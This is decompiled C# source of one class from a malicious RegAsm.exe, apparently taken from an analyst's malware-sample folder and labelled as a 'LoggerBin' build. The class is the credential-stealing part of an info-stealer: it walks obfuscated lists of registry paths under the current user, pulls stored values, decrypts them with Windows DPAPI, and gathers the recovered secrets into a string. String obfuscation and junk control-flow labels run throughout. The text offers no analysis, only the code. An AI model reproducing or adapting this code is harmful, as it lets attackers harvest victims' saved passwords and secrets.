// Decompiled with JetBrains decompiler
// Type: B8.jD
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using VW1;

namespace B8
{
  internal static class jD
  {
    internal static jD PHH;

    public static string fE()
    {
      try
      {
        if (!Convert.ToBoolean(XWr.EnableBrowserRecovery))
          return w4.bx(666, w4.vY);
        string empty = string.Empty;
        string[] strArray1 = new string[8]
        {
          w4.bx(1762, w4.vY),
          w4.bx(1942, w4.vY),
          w4.bx(2122, w4.vY),
          w4.bx(2302, w4.vY),
          w4.bx(2482, w4.vY),
          w4.bx(2662, w4.vY),
          w4.bx(2842, w4.vY),
          w4.bx(3090, w4.vY)
        };
        string[] strArray2 = new string[28]
        {
          w4.bx(3270, w4.vY),
          w4.bx(3310, w4.vY),
          w4.bx(3336, w4.vY),
          w4.bx(3362, w4.vY),
          w4.bx(3394, w4.vY),
          w4.bx(3426, w4.vY),
          w4.bx(3466, w4.vY),
          w4.bx(3498, w4.vY),
          w4.bx(3524, w4.vY),
          w4.bx(3550, w4.vY),
          w4.bx(3582, w4.vY),
          w4.bx(3596, w4.vY),
          w4.bx(3618, w4.vY),
          w4.bx(3652, w4.vY),
          w4.bx(3674, w4.vY),
          w4.bx(3696, w4.vY),
          w4.bx(3736, w4.vY),
          w4.bx(3770, w4.vY),
          w4.bx(3792, w4.vY),
          w4.bx(3824, w4.vY),
          w4.bx(3856, w4.vY),
          w4.bx(3888, w4.vY),
          w4.bx(3928, w4.vY),
          w4.bx(3960, w4.vY),
          w4.bx(3990, w4.vY),
          w4.bx(4020, w4.vY),
          w4.bx(4050, w4.vY),
          w4.bx(4088, w4.vY)
        };
        for (int index = 0; index < strArray1.Length; ++index)
          empty += C6.bx(strArray1[index], strArray2, C6.vi);
        if (!string.IsNullOrWhiteSpace(empty))
        {
          XWr.IsPass = true;
          return empty;
        }
      }
      catch
      {
      }
      return w4.bx(686, w4.vY);
    }

    public static string nq(string _param0, string[] _param1)
    {
      Regex regex1 = new Regex(w4.bx(4118, w4.vY));
      Regex regex2 = new Regex(w4.bx(4266, w4.vY));
      string str = (string) null;
      try
      {
        int index = 0;
        while (index < _param1.Length)
        {
          try
          {
            object obj = wR.bx(_param0, _param1[index], wR.G8);
            if (obj != null && _param1[index].Contains(w4.bx(1510, w4.vY)) && !jD.zHa((object) _param1[index], (object) w4.bx(4386, w4.vY)))
              str = str + _param1[index] + w4.bx(4392, w4.vY) + IX.bx((byte[]) obj, IX.DS) + w4.bx(822, w4.vY);
            else if (obj != null)
            {
              if (regex1.IsMatch(obj.ToString()) || regex2.IsMatch(obj.ToString()))
              {
                str = str + _param1[index] + w4.bx(4392, w4.vY) + obj.ToString() + w4.bx(822, w4.vY);
                int num1 = 0;
                if (!jD.kHT())
                  goto label_12;
label_9:
                switch (num1)
                {
                  default:
                    goto label_6;
                }
label_12:
                int num2;
                num1 = num2;
                goto label_9;
              }
              else
                str = str + _param1[index] + w4.bx(4392, w4.vY) + Encoding.UTF8.GetString((byte[]) obj).Replace(Convert.ToChar(0).ToString(), "") + w4.bx(822, w4.vY);
            }
          }
          catch
          {
          }
label_6:
          ++index;
          int num = 0;
          if (jD.kHT())
            goto label_7;
label_3:
          switch (num)
          {
            default:
              continue;
          }
label_7:
          num = 0;
          goto label_3;
        }
        foreach (object subKeyName in Registry.CurrentUser.OpenSubKey(_param0, false).GetSubKeyNames())
        {
          try
          {
            str = str + C6.bx((string) jD.VHd((object) _param0, (object) w4.bx(1412, w4.vY), subKeyName), _param1, C6.vi) + w4.bx(822, w4.vY);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      return str;
    }

    public static string uB(byte[] _param0)
    {
      try
      {
        byte[] encryptedData = new byte[_param0.Length - 1];
        Buffer.BlockCopy((Array) _param0, 1, (Array) encryptedData, 0, _param0.Length - 1);
        return Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, (byte[]) null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
      }
      catch
      {
      }
      return w4.bx(4400, w4.vY);
    }

    public static object Ki(string _param0, string _param1)
    {
      object obj = (object) "";
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(_param0, RegistryKeyPermissionCheck.ReadWriteSubTree);
        obj = subKey.GetValue(_param1);
        subKey.Close();
      }
      catch
      {
      }
      return obj;
    }

    internal static bool kHT() => jD.PHH == null;

    internal static jD WHl() => jD.PHH;

    internal static bool zHa([In] object obj0, [In] object obj1) => ((string) obj0).Contains((string) obj1);

    internal static object VHd([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);
  }
}
